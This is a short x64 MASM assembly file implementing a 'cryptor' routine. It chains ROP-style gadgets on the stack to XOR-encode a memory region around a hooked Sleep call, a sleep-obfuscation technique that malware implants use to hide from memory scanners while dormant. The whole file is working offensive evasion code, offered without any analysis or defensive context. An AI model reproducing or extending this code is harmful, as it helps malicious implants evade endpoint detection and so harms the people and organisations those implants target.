asmFunc proto
cryptor proto
gadgetFuncXor proto

.data
.code

asmFunc proc
    push rcx
    mov rcx, rdx
    ret
asmFunc endp

; crypter(Gadget, (LPVOID)OldSleep, dwMiliseconds, (LPVOID)xor_bidirectional_encode, encLocation, encLocationSize)
;           RCX          RDX              R8                         R9                 Stack+28       Stack+30
cryptor proc
    ;add  rsp, 0000000000000028h
    COMMENT @
    push r9
    push [rsp + 0000000000000042h]
    push [rsp + 0000000000000042h]
    push 0000000000000001h
    push 00000041h
    push rcx
    @
    mov  r10, [rsp + 000000000000030h]
    mov  r11, [rsp + 000000000000028h]

    push r9
    push r10
    push r11
    push 0000000000000001h
    push 000000000000000041h
    push rsp
    push rcx

    push rdx
    push 0000000000000000h
    push 0000000000000000h
    push 0000000000000000h
    push 0000000000000000h
    push r8
    push rcx

    push r9
    push r10
    push r11
    push 0000000000000001h
    push 000000000000000041h
    push rsp
    push rcx
    ret ; gadget lives in rcx
cryptor endp

gadgetFuncXor proc
    pop rcx ; first arg
    pop r11 ; nop
    pop rdx ; second arg
    pop r8 ; third arg
    pop r9 ; fourth arg
    ret
gadgetFuncXor endp

end